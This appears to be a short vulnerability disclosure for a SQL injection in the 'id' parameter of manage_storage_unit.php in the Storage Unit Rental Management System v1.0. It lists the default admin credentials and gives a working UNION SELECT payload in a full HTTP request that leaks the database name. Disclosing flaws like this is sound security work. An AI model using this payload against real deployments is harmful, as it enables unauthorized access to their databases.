# Storage Unit Rental Management System v1.0 by sourcecodester has SQL injection 3

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/14932/storage-unit-rental-management-system-using-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /storage/admin/maintenance/manage_storage_unit.php

Vulnerability location: /storage/admin/maintenance/manage_storage_unit.php?id=, id

dbname = storage_db

[+] Payload: /storage/admin/maintenance/manage_storage_unit.php?id=0%27%20union%20select%201,database(),3,4,5--+ // Leak place ---> id

```sql
GET /storage/admin/maintenance/manage_storage_unit.php?id=0%27%20union%20select%201,database(),3,4,5--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=30ohdkf99du0vfp79d5hmk7701
Connection: close


```

<img width="1072" height="425" alt="image" src="https://github.com/user-attachments/assets/c5a58d61-1e59-4ebd-b7e7-dbf86d39a22d" />
